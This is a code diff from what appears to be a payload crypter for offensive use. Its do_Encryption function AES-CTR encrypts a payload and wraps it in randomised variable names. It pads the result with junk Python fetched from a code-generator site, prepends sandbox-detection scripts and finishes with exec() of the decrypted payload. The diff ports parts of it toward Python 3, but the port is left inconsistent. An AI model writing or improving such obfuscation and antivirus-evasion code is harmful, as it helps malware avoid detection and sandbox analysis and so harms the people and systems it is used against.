@@ -6,6 +6,7 @@ import requests
 from html.parser import HTMLParser
 import re
 import blessed
+from lxml.html import parse
 
 t = blessed.Terminal()
 
@@ -53,19 +54,20 @@ def do_Encryption(payload):
     randkey = randomVar()
     randcounter = randomVar()
     randcipher = randomVar()
-
     randdecrypt = randomJunk()
     randshellcode = randomJunk()
     randbuf = randomJunk()
     randptr = randomJunk()
     randht = randomJunk()
-
     randctypes = randomJunk()
     randaes = randomJunk()
 
     try:
-        rawHTML = HTMLParser().unescape(requests.get('http://www.4geeks.de/cgi-bin/webgen.py').text)
-        randomPython = re.sub('<.*>', '', rawHTML).strip().replace('.','')
+        #rawHTML = HTMLParser().unescape(requests.get('http://www.4geeks.de/cgi-bin/webgen.py').text)
+        rawHTML = parse('http://www.4geeks.de/cgi-bin/webgen.py').getroot()
+        for pre in rawHTML.cssselect('pre'):
+            randomPython = pre.text_content()
+            
     except:
         print (t.bold_red + '[!] No network Connection, random python not generated.' + t.normal)
         randomPython = 'if __name__ == \'__main__\':'
@@ -79,10 +81,10 @@ def do_Encryption(payload):
     newpayload += getSandboxScripts('python')
     newpayload += randomPython
     newpayload += "\n\t%s = '%s'\n"% (randomVar(), randomJunk())
-    newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
-    newpayload += "\t%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
+    newpayload += "\t%s = '%s'.decode('hex') \n" % (randkey, key.hex())
+    newpayload += "\t%s = '%s'.decode('hex') \n" % (randcounter, counter.hex())
     newpayload += "\t%s = '%s'\n"% (randomVar(), randomJunk())
     newpayload += "\t%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
-    newpayload += "\t%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
-    newpayload += "\texec(%s)" % randcipher
+    newpayload += "\t%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.hex())
+    newpayload += "\texec(%s)" % (randcipher)
     return newpayload
